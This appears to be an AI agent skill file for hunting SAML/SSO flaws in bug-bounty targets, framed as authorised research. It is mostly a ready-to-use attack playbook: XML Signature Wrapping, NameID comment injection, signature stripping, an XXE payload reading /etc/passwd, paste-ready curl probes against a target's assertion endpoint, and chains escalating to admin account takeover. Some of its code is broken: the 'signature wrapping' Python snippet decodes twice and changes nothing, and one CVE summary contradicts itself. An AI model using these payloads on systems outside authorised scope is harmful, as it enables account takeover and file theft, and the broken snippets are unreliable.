---
name: hunt-saml
description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
sources: cve_database, oasis_saml_spec, academic_research, public_research
report_count: 6
---

## 20. SAML / SSO ATTACKS
> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.

### Attack Surface
```bash
# Find SAML endpoints
cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
```

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- BEFORE: valid assertion by user@company.com -->
<saml:Response>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
     App processes the FIRST assertion found = evil. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Attacker registers/controls account: admin@company.com.evil.com -->
<NameID>admin@company.com<!---->.evil.com</NameID>
<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
     digest): "admin@company.com.evil.com" — the value the signature covers. -->
<!-- App's XML processor also strips the comment but only reads the text node
     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
     identity than was signed. The discrepancy is the bug. -->
<!-- Works when signer's C14N and app's text extraction disagree on comments.
     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
2. Delete the entire <Signature> element
3. Change NameID to admin@company.com
4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
5. Submit — if server doesn't verify signature presence = admin ATO
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

### Attack 5: NameID Manipulation
```
Test these NameID values:
- admin@company.com (generic admin)
- administrator@company.com
- support@target.com
- Any email found in disclosed reports for this program
- ${7*7} (SSTI if NameID gets rendered in a template)
```

### Tools
```bash
# SAMLRaider (Burp extension) — automated XSW testing
# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab

# Manual workflow:
echo "BASE64_SAML" | base64 -d > saml.xml
# Edit saml.xml
base64 -w0 saml.xml  # Re-encode
# URL-encode the result before sending as SAMLResponse parameter
```

### Before any of this: you need a legitimately-signed assertion

None of the attacks below are testable without an IdP that issues real signed assertions. Programs
increasingly require the researcher to configure their own IdP (Okta / Entra / Google Workspace) —
and those signups are captcha-gated, so they are not automatable. Baseline the ACS with malformed
input first (it is fast and sometimes reportable on its own), then stand up a self-hosted Keycloak
realm: real password auth + real signing, no signup, no captcha, HTTPS issuer via self-signed cert.

**⚠️ Check this BEFORE building any lab:** many SPs allow-list the IdP provider domain and reject
anything that is not Google / Microsoft / Okta, with a message like *"The Entry Point and Issuer
URLs must belong to a trusted identity provider (Google, Microsoft, or Okta)."* A self-hosted
Keycloak is then useless against that SP no matter how cleanly it is exposed — observed live: a
localhost IdP left the SP's Save button disabled (`Invalid parameters or file structure`), and the
same IdP behind a public HTTPS tunnel only surfaced the allow-list message. Read the brief's IdP
instructions first; if it names providers, the lab is for **payload training only** and the real
test needs the named provider (whose signups are usually captcha-gated and not automatable).

**See `references/self-hosted-idp-test-harness.md`** — the allow-list gotcha in detail, ACS baseline
commands, Keycloak setup (port-8080 collision, `kc.bat` space-mangled paths, `kcadm -f client.json`,
admin-password-only-on-first-boot, tree-kill of the child JVM), self-signed cert + Chrome
`thisisunsafe` bypass, public HTTPS issuer via `cloudflared` + `--hostname/--proxy-headers`,
exporting the SIG cert, and the pre-flight SP harness that validates NameID / InResponseTo /
signature before you touch the target.

### Harness discipline: assertions are ONE-TIME-USE (get this wrong and every result is a false negative)

A signed assertion is consumed on first submit. If you POST it once as a "control" and then
re-POST it (or a variant of it) to the same ACS, the second submit fails with a generic
"failed / contact your administrator" message. That failure means **replay protection worked**,
NOT that your tampering was detected. Observed live: a control, an unsigned variant, and a
NameID-swapped variant all returned the identical generic error, which looks like "the SP
rejects everything" — the real cause was that all four submissions shared one already-consumed
assertion.

**Correct sequence:**

1. **Intercept, never submit.** Capture the SAML POST in the browser and fulfil it locally so
   the app's own submit never reaches the ACS:
   ```python
   async def handler(route):
       pd = route.request.post_data or ""
       if "SAMLResponse=" in pd:
           box["saml"]  = urllib.parse.unquote(pd.split("SAMLResponse=")[1].split("&")[0])
           if "RelayState=" in pd:
               box["relay"] = pd.split("RelayState=")[1].split("&")[0]
       await route.fulfill(status=200, content_type="text/html",
                           body='<script>var redirectUrl="#";</script>{"result":true}')
   await page.route("**/saml/acs", handler)   # adjust path to the real ACS
   ```
2. **Control FIRST, and only once.** POST the untouched assertion. A success here proves the
   harness works AND that the token was still fresh. If the control fails, stop — you have a
   replay/freshness problem, not a security finding.
3. **One fresh token per variant.** Return to the IdP and issue a brand-new assertion for every
   single variant. Budget one full login round-trip per test (~40s each). Do not batch.
4. Carry `RelayState` through unchanged, and send `Origin`/`Referer` of the IdP — many SPs bind
   the flow loosely to those.

### Response-level signature stripped and still accepted = SPEC-COMPLIANT, not a bug

The SAML WebSSO profile permits an IdP to sign **only the Assertion** and leave the enclosing
`<Response>` unsigned. So this matrix is the *correct* observed behaviour, not a finding:

| Variant | Result | Meaning |
|---|---|---|
| control, untouched | accepted | harness good |
| strip **all** signatures | rejected | signature presence enforced |
| strip **Response-level** signature only | **accepted** | assertion signature still enforced — allowed by profile |
| NameID changed (incl. comment-injection) | rejected | integrity enforced on identity |
| XSW: evil-first / nested / sig-wrapped | rejected | parser picks the correct signed node |
| replay same token | rejected | one-time use enforced |

A parser that validates the assertion signature and ignores a missing response signature is
**sound**. Reporting "response signature not validated" here is AI-slop and will burn reporter
credibility. Only escalate if the *assertion-level* signature can be bypassed, or if a modified
NameID/Role inside a signed assertion is honoured.

### SAML Triage
```
XSW successful   = Critical (ATO any user)
Sig stripping    = Critical (ATO any user)
Comment injection = High (ATO admin)
XXE in assertion = High (file read / SSRF)
NameID manip     = Medium/High (depends on what NameID maps to)
```

---

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Signature wrapping: pindahkan assertion ke posisi tak diverifikasi | Bypass tanda tangan |
| 2 | XML comment injection di NameID | Manipulasi identitas |
| 3 | `Recipient`/`Destination` tidak divalidasi | Replay ke endpoint lain |
| 4 | XML Signature exclusion: hapus `<Signature>` | Tanpa verifikasi |
| 5 | Assertion replay: pakai assertion lama setelah logout | Sesi tak dibatalkan |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa login sebagai korban dengan assertion SAML yang tanda tangannya dihapus" — tunjukkan sesi yang didapat.
2. **Apa yang hilang dari korban?** Akses akun via SSO. Tunjukkan akses yang didapat.
3. **Bisa direproduksi 10 menit dari nol?** Gunakan IdP uji; sertakan assertion dan respons.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** manipulasi assertion SSO

**Teknik pengembangan:** XSW signature wrapping; audience removal; comment injection

**Eskalasi ke:** `hunt-auth-bypass` · `hunt-ato`

**Depth target:** L3 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Runnable probes

Commands you can paste. `<TARGET>`/`<RPC>` are placeholders — fill them
from recon, do not guess endpoints.

```bash
# 0) capture a real SAMLResponse from your own account (SP-initiated flow)
curl -sS -c jar.txt -L 'https://<TARGET>/sso/login' -o sso.html
# complete the IdP login in a browser with your test account, then export the
# SAMLResponse from the POST back to the SP (DevTools -> Network -> Payload).

# 1) XML SIGNATURE WRAPPING — move the assertion to a position the SP does not verify
python - <<'PY'
import base64, re
x = base64.b64decode(open('saml.b64').read()).decode()
xml = base64.b64decode(x).decode()
# duplicate the Assertion, keep the ORIGINAL signature over the original copy,
# and edit the NameID in the copy the SP reads. Then re-encode.
print(base64.b64encode(xml.encode()).decode()[:80])
PY

# 2) SIGNATURE EXCLUSION — delete <ds:Signature> entirely
sed 's|<ds:Signature.*</ds:Signature>||g' saml.xml > saml_nosig.xml

# 3) XML COMMENT INJECTION in NameID
#   <NameID>admin@x.com<!-- -->@attacker.example</NameID>
#   different parsers resolve this differently -> privilege confusion

# 4) replay the assertion after logout
curl -sS -X POST 'https://<TARGET>/saml/acs' --data-urlencode "SAMLResponse=$(cat saml.b64)" \
  -o acs.html -w '%{http_code}\n'

# 5) destination/recipient not validated -> post to a DIFFERENT SP endpoint
curl -sS -X POST 'https://<TARGET>/saml/acs-alt' --data-urlencode "SAMLResponse=$(cat saml.b64)" \
  -o alt.html -w '%{http_code}\n'
```

**Proof bar:** you must end up **logged in as B** from an assertion you forged or
replayed. A 200 on `/saml/acs` alone is not a bypass.

---

## Related Skills & Chains

- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
- **`hunt-xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.


## 2026 sweep 4 (dork pass 2026-10-18 — 2 repo)

- CVE-2026-60206 — **Oracle WebLogic Server SAML authentication bypass, CVSS 9.9**. The bypass includes an **AudienceRestriction** removal/modification so the assertion is accepted outside its intended audience. Lesson: audience validation is a separate control from signature validation — test them independently.
  - CVE-2026-60206 – Oracle WebLogic Server SAML Authentication Bypass PoC
  - Audience Restriction Bypass** – remove or modify `AudienceRestriction` to broaden scope.
- CVE-2026-24858 — **FortiCloud SSO administrative bypass**: the feature is enabled by factory default on any registered FortiGate/FortiManager/FortiAnalyzer, and an attacker owning *any* FortiCloud account (free tier included) can reuse their SSO token to log into **other customers' appliances**. Lesson: shared-IdP tenancy is a cross-tenant boundary — ask who else holds a valid token.
  - FortiCloud Single-Sign-On (SSO) a factory default enabled feature once you register any FortiGate/FortiManager/FortiAnalyzer contains a critical authentication-bypas
  - An attacker who owns any FortiCloud account (free or paid) can reuse his SSO token to log into other customers’ appliances (≤ builds listed below) without knowing th


## 2026 sweep 7 (dork pass 2026-10-18 — 2 repo)

- CVE-2026-8080 — **DKIM signature-verification bypass via header canonicalization flaw**: the verifier canonicalizes *all* headers instead of only the ones listed in the signature, so an attacker can include an extra header (`X-Extra`) that is present in the actual message. Lesson: canonicalization scope is a security boundary — a verifier that normalizes more than the signer signed makes the signature meaningless.
  - CVE-2026-8080 – DKIM Signature Verification Bypass (Header Canonicalization Flaw)
  - because the verifier canonicalizes all headers instead of just the listed ones.
- CVE-2026-60206 — Oracle WebLogic **SAML authentication bypass → admin takeover**, exploitable two ways: (1) improper validation of SAML assertions lets an attacker craft a malicious response, and (2) **XML Signature Wrapping (XSW)** bypasses XML signature validation. Lesson: on SAML endpoints test assertion *content* tampering and signature *wrapping* as separate attacks.
  - CVE-2026-60206 - Oracle WebLogic SAML Auth Bypass Exploit Framework-Toolkit


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

XML Signature Wrapping (XSW) → forge assertion; comment injection di NameID; signature stripping; XXE di assertion; NameID manipulation → impersonasi user lain. Kalibrasi: IdP yang validasi signature pada node yang benar = correct; assertion tanpa signature yang diterima = Critical.
